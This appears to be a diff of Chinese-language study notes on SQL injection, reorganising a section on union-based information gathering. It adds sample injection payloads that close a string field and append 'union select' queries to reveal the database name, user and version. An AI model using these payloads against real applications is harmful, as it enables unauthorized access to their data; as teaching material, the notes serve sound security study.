@@ -338,16 +338,16 @@ kobe' and 1=2#;
 
 ### 案例1-基于union的信息获取
 ```sql
---union用法，前后字段数一致
-select email from user where id = 1 union select 字段1 from 表名 where 条件;
-
-select 
-
-
-
+select email from user where id = 1 union select database();
+select email from user where id = 1 union select user();
+select email from user where id = 1 union select version();
+--字符型sql注入闭合，先用order by判断字段数，假设为1
+xx' union select database();
 ```
 ### mysql相关知识
 ```sql
+--union用法，前后字段数一致
+select email from user where id = 1 union select 字段1 from 表名 where 条件;
 select database();--获取当前数据库名称
 select user();--当前用户权限
 select version();--当前数据库版本
